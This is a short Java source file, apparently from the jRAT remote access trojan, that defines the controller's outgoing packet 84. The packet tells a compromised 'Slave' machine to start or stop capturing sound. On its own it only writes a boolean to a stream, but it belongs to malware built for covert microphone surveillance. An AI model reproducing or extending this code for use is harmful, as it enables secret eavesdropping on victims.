package pro.jrat.packets.outgoing;

import java.io.DataOutputStream;

import pro.jrat.Slave;


public class Packet84SoundCapture extends AbstractOutgoingPacket {
	
	private boolean initialize;

	public Packet84SoundCapture(boolean initialize) {
		this.initialize = initialize;
	}
	
	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeBoolean(initialize);
	}

	@Override
	public byte getPacketId() {
		return 84;
	}

}
